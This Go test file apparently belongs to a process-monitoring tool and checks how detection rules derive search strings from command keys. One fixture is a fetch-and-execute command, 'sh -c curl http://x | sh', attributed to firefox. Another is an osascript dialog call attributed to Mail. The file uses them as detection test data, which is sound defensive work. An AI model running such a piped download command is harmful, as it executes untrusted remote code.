package signals

import (
	"testing"

	"github.com/drduh/mess/internal/event"
	"github.com/drduh/mess/internal/pids"
)

func TestRowFindIsTheSearchForTheRow(t *testing.T) {
	for _, c := range []struct {
		scope, key, want string
	}{
		{"command", "sh", "sh"},
		{"command", "bash -l", "bash -l"},
		{"binary", "git", "git"},
		{"file", "exec-mac-1.log", ""},
		{"path", "/tmp/x/sh", "/tmp/x/sh"},
		{"identity", "org.brew.git [B1]", "org.brew.git [B1]"},
		{"command", "git status --porcelain", "git status"},
		{"command", Keyed("firefox", "sh -c curl http://x | sh"), "curl http://x"},
		{"command", Keyed("Mail", "osascript -e display dialog"), "display dialog"},
		{"command", Keyed("firefox", ""), ""},
	} {
		if got := findFor(c.scope, c.key); got != c.want {
			t.Errorf("findFor(%q, %q) = %q, want %q", c.scope, c.key, got, c.want)
		}
	}

	for _, cmd := range []string{"sh -c x", "git status", "", "a → b"} {
		if got := commandIn(Keyed("from", cmd)); got != cmd {
			t.Errorf("commandIn(Keyed(%q)) = %q", cmd, got)
		}
	}

	if got := commandIn("git status"); got != "git status" {
		t.Errorf("commandIn of a bare key = %q", got)
	}
}

// A rule Find replaces the scope search.
func TestRowFindIsTheRulesWhenItHasOne(t *testing.T) {
	own := Rule{ID: "dest", Title: "t", Tier: Notice, Scope: "command", Summary: "s", Because: "b",
		Match: func(*Seen) string { return "host:/path" },
		Find:  func(key string) string { return "searched " + key }}

	plain := own
	plain.ID, plain.Find = "plain", nil

	list := Build([]Rule{own, plain},
		pids.Over([]event.Event{{Time: at(0), Cmd: []string{"x"}}}), at(0), at(1), 1)
	if got := ByID(list, "dest").Rows[0].Find; got != "searched host:/path" {
		t.Errorf("with a Find, the row searches %q", got)
	}

	if got := ByID(list, "plain").Rows[0].Find; got != "host:/path" {
		t.Errorf("without one, the row searches %q, want the scope's reading of the key", got)
	}
}
